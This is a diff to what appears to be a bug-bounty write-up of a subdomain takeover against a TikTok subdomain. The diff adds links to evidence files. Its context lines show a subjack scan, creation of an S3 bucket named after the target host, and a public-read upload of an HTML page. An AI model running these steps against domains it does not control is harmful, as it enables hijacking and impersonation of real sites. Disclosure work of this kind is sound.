@@ -31,3 +31,8 @@ subjack -w subs.txt -t 100 -ssl -v -o takeover-results.txt
 aws s3 mb s3://academy-outbound-ads.tiktok.com
 aws s3 cp @codegrunt.html s3://academy-outbound-ads.tiktok.com --acl public-read
 eGrunt-Bounties
+## 📎 Downloads & Evidence
+
+- 🔗 [@codegrunt.html](./%40codegrunt.html)
+- 📄 [takeover-results.txt](./takeover-results.txt)
+- 📦 [tiktok_subdomain_takeover_proof_final.zip](./tiktok_subdomain_takeover_proof_final.zip)
